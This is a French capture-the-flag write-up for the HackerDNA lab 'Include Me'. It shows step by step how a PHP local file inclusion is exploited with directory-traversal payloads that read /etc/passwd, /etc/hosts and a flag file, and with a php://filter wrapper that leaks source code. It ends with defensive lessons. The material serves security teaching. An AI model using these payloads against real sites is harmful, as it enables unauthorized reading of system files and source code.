# Compte rendu : Include Me
Plateforme : HackerDNA ( https://hackerdna.com/labs/include-me )
Auteur : SRH
Catégorie : Web, File Inclusion
Difficulté : Facile
Tags : LFI, PHP, Directory Traversal, php://filter

## Scénario
Exploiter une vulnérabilité d'un paramètre d'inclusion de fichier PHP pour effectuer une inclusion de fichier locale (LFI) et récupérer le flag caché du serveur.

Prérequis : Aucun.

## Chaîne d'Attaque
[Découverte paramètre page=] → [Test LFI] → [Lecture /etc/passwd] → [Énumération] → [Lecture du code source via php://filter] → [Localisation du flag] → 🚩

## Étape 1 — Reconnaissance initiale
Navigation vers la cible :

```
http://[IP_CIBLE]
```

L'application affichait un site web d'entreprise simple, sans fonctionnalité apparente ni champ de saisie.

Cependant, l'URL contenait un paramètre intéressant :

```
http://[IP_CIBLE]/index.php?page=about.html
```

Analyse :
Le paramètre `page=` suggère fortement que l'application inclut dynamiquement des fichiers via PHP.
C'est un indicateur classique d'une potentielle vulnérabilité d'inclusion de fichier local (LFI).

Une implémentation vulnérable courante ressemble à ceci :

```php
include($_GET["page"]);
```

## Étape 2 — Test de traversée de répertoire
Tentative d'envoi d'une charge utile LFI standard :

```
http://[IP_CIBLE]/index.php?page=../../../../etc/passwd
```

L'application a renvoyé le contenu du fichier `/etc/passwd` :

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Cela a confirmé :
- Le parcours de répertoire fonctionne
- Des fichiers locaux arbitraires peuvent être inclus
- Il existe une vulnérabilité LFI

## Étape 3 — Énumération supplémentaire
Autres fichiers courants testés :

```
index.php?page=../../../../etc/hosts
```

Retourné :

```
127.0.0.1 localhost
10.0.13.77 ip-10-0-13-77.eu-west-1.compute.internal
```

Validation de la racine Web :

```
index.php?page=../../../../var/www/html/about.html
```

La page "À propos" a été chargée avec succès, confirmant :

- Racine Web = `/var/www/html`

## Étape 4 — Lecture du code source de l'application
Pour inspecter le code source PHP sans l'exécuter, utilisation des wrappers de flux PHP :

```
index.php?page=php://filter/convert.base64-encode/resource=index.php
```

La réponse a renvoyé un code source PHP encodé en Base64.
Décodage en local :

```bash
echo 'BASE64_DATA' | base64 -d
```

Source décodée :

```php
<?php

if (!isset($_GET["page"])) {
    header("Location: index.php?page=about.html");
    die();
} else {
    include($_GET["page"]);
}
```

Analyse du code source :
La vulnérabilité est confirmée directement :

```php
include($_GET["page"]);
```

L'application :
- Aucune désinfection effectuée
- Aucune liste blanche utilisée
- Entrée contrôlée par l'utilisateur incluse directement

Cela permet l'inclusion de fichiers locaux arbitraires.

## Étape 5 — Localiser le flag
Premières tentatives visant des emplacements communs (échouées car la profondeur de parcours était insuffisante) :

```
index.php?page=../../../../root/flag.txt
index.php?page=../../../../var/www/html/flag.txt
index.php?page=../../../../flag.txt
```

## Étape 6 — Exploitation réussie
Profondeur de traversée étendue :

```
http://[IP_CIBLE]/index.php?page=../../../../../../../flag.txt
```

Le flag a été récupéré avec succès à partir du fichier exposé.

🚩 Flag : FLAG{...}
(Le flag a été intentionnellement omis pour préserver l'intégrité du défi)

## Conclusion
L'inclusion de fichiers contrôlée par l'utilisateur est extrêmement dangereuse. Une simple traversée de répertoires (`../`) permet d'échapper au répertoire web prévu et de lire des fichiers sensibles du système.

## Leçons Apprises
1. L'inclusion de fichiers contrôlée par l'utilisateur est extrêmement dangereuse.
2. La traversée de répertoires (`../`) permet d'échapper aux répertoires web prévus.
3. La lecture du fichier `/etc/passwd` est une étape de confirmation classique pour les vulnérabilités LFI.
4. Les wrappers de flux PHP (`php://filter`) peuvent exposer du code source sans l'exécuter.
5. La validation des entrées et la mise en place de listes blanches sont des protections essentielles.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
